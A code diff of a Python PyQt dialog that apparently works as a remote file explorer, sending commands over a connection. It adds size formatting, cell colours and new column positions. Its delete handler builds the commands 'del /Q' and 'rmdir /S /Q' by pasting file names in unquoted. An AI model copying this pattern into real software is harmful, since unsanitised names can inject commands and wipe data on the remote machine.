@@ -411,6 +411,13 @@ class MainDialog(QWidget, gui.Ui_Form):
             else:
                 return 'Folder'
 
+        def sizeof_fmt(num, suffix='B'):
+            for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
+                if abs(num) < 1024.0:
+                    return "%3.1f%s%s" % (num, unit, suffix)
+                num /= 1024.0
+            return "%.1f%s%s" % (num, 'Yi', suffix)
+
         # Turn combo signal off
         self.comboInEditMode = True
 
@@ -457,11 +464,40 @@ class MainDialog(QWidget, gui.Ui_Form):
             except Exception, e:
                 self.statusno('Error while parsing directory', self.lineno())
                 ext = ''
+            # set icon
             self.explorerTable.setCellWidget(n, 0, ImgWidget(img(dic[i]['type'], ext)))
-            item = QTableWidgetItem(type(dic[i]['type']))
-            self.explorerTable.setItem(n, 1, item)
-            item = QTableWidgetItem(dic[i]['name'])
+
+            # set content type
+            item = QTableWidgetItem('File') if dic[i]['type'] else QTableWidgetItem('Folder')
+            if dic[i]['type']:
+                item.setTextColor(QColor(0, 255, 255))
+            else:
+                item.setTextColor(QColor(192, 192, 192))
             self.explorerTable.setItem(n, 2, item)
+
+            # set content name
+            item = QTableWidgetItem(dic[i]['name'])
+            if dic[i]['type']:
+                item.setTextColor(QColor(0, 255, 255))
+            else:
+                item.setTextColor(QColor(192, 192, 192))
+            self.explorerTable.setItem(n, 4, item)
+
+            # set content modified date
+            item = QTableWidgetItem(dic[i]['modified'])
+            self.explorerTable.setItem(n, 6, item)
+
+            # set file size
+            item = QTableWidgetItem(sizeof_fmt(dic[i]['size'])) if dic[i]['type'] else QTableWidgetItem('')
+            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+            item.setTextColor(QColor(0, 255, 255))
+            self.explorerTable.setItem(n, 8, item)
+
+        # update table
+        self.explorerTable.resizeColumnsToContents()
+        self.explorerTable.horizontalHeaderItem(8).setTextAlignment(Qt.AlignCenter)
+
+        # count files & directories
         self.explorerContentLabel.setText('Directories: %s Files: %s' % (str(len([i for i in dic if dic[i]['type'] is False])), str(len([i for i in dic if dic[i]['type'] is True]))))
 
     # Change Drive
@@ -492,8 +528,8 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         self.statusok('Get folder name', self.lineno())
         # Get folder name
-        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text()
-        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text()
+        type = self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text()
+        name = self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text()
 
         if type == 'Folder':
 
@@ -558,10 +594,10 @@ class MainDialog(QWidget, gui.Ui_Form):
             warn.setStyleSheet(style.msgboxStyle)
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
-                if self.explorerTable.item(self.explorerTable.currentItem().row(), 1).text() == 'File':
-                    self.Send('del /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text())
+                if self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text() == 'File':
+                    self.Send('del /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text())
                 else:
-                    self.Send('rmdir /S /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 2).text())
+                    self.Send('rmdir /S /Q %s' % self.explorerTable.item(self.explorerTable.currentItem().row(), 4).text())
                 if self.Receive() == 'ConnectionError':
                     return
             else:
